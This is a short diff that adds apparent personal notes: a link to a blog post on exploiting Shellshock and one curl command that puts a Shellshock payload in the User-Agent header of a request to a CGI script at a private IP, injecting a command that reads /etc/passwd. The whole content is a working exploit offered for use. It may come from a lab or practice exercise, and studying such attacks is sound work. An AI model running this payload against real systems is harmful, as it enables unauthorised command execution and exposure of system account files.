@@ -1,0 +1,3 @@
+https://www.sevenlayers.com/index.php/125-exploiting-shellshock
+
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://192.168.90.59/cgi-bin/test.sh
